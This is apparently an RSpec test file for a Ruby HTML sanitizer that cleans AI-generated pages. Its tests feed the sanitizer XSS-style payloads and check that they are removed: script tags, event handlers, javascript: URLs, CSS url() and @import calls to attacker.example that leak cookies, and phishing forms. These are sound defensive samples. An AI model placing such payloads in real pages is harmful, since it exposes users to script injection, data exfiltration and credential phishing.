# frozen_string_literal: true

require "spec_helper"

describe Ai::PageSanitizer do
  describe ".sanitize" do
    it "returns an empty string for blank input" do
      expect(described_class.sanitize(nil)).to eq("")
      expect(described_class.sanitize("")).to eq("")
    end

    it "preserves allowed tags and attributes" do
      html = %(<div class="hero"><h1>Hi</h1><a href="https://example.com">link</a></div>)
      out = described_class.sanitize(html)
      expect(out).to include("<h1>Hi</h1>")
      expect(out).to include(%(class="hero"))
      expect(out).to include(%(href="https://example.com"))
    end

    it "strips <script> tags so they cannot execute" do
      html = %(<div>hi</div><script>alert(1)</script>)
      out = described_class.sanitize(html)
      expect(out).not_to include("<script")
      expect(out).not_to include("</script>")
    end

    it "strips inline event handler attributes" do
      html = %(<div onclick="steal()">click</div>)
      out = described_class.sanitize(html)
      expect(out).not_to include("onclick")
      expect(out).not_to include("steal()")
    end

    # Regression: the dangerous-pattern prepass is anchored to an attribute
    # boundary so `on\w+=` doesn't match the trailing characters of
    # `data-onload=`. The Rails sanitizer ultimately drops attributes that
    # aren't allow-listed, but the prepass must not slice an attribute name
    # in half and leave a stray quoted value that survives later passes.
    it "does not match on* anchored inside data-on* attribute names" do
      handler = Ai::PageSanitizer::DANGEROUS_PATTERNS.find { |p| p.source.include?("on\\w+") }
      expect(handler).not_to be_nil
      expect(%( data-onload=)).not_to match(handler)
      expect(%(data-onload=)).not_to match(handler)
      expect(%(-onload=)).not_to match(handler)
      expect(%( onload=)).to match(handler)
      expect(%(<div onclick=)).to match(handler)
    end

    it "strips javascript: URLs" do
      html = %(<a href="javascript:alert(1)">x</a>)
      out = described_class.sanitize(html)
      expect(out).not_to include("javascript:")
    end

    it "strips CSS expression() in style content" do
      html = %(<div style="width:expression(alert(1))">hi</div>)
      out = described_class.sanitize(html)
      expect(out).not_to include("expression(")
    end

    # Regression: style attribute must not be allow-listed. Even if it were,
    # url(...) in style values would let a malicious/hallucinated template
    # exfiltrate referer/cookies from any non-sandboxed render context
    # (admin preview, email, etc.).
    it "strips the style attribute entirely" do
      html = %(<div style="color:red">hi</div>)
      out = described_class.sanitize(html)
      expect(out).not_to include("style=")
      expect(out).to include("hi")
    end

    it "neutralizes url() exfiltration vectors in style attributes" do
      html = %(<div style="background:url(https://attacker.example/leak?c=1)">hi</div>)
      out = described_class.sanitize(html)
      expect(out).not_to include("attacker.example")
      expect(out).not_to include("url(")
    end

    it "neutralizes @import in style attributes" do
      html = %(<div style="@import url(https://attacker.example/x.css)">hi</div>)
      out = described_class.sanitize(html)
      expect(out).not_to include("@import")
      expect(out).not_to include("attacker.example")
    end

    it "strips disallowed tags but keeps their inner text" do
      html = %(<form><input type="text"><iframe src="evil"></iframe>kept</form>)
      out = described_class.sanitize(html)
      expect(out).not_to include("<iframe")
      expect(out).to include("kept")
    end

    # Regression: form-input tags must not be allow-listed. A hallucinated
    # AI page or compromised template otherwise serves a credible
    # <form action="https://attacker/login"> under the seller's custom
    # domain — a turn-key phishing primitive. Buy buttons render as
    # <a data-gumroad-action="buy">, not <button>, so we never need them.
    it "strips form-input tags so AI pages can't phish credentials" do
      %w[form input button select textarea option label fieldset].each do |tag|
        html = %(<#{tag} action="/login">visible</#{tag}>)
        out = described_class.sanitize(html)
        expect(out).not_to include("<#{tag}"), "expected <#{tag}> to be stripped, got: #{out}"
        expect(out).to include("visible") if tag.in?(%w[button label option fieldset]) # block-level tags keep inner text; void/replaced (<input>) do not
      end
    end
  end
end
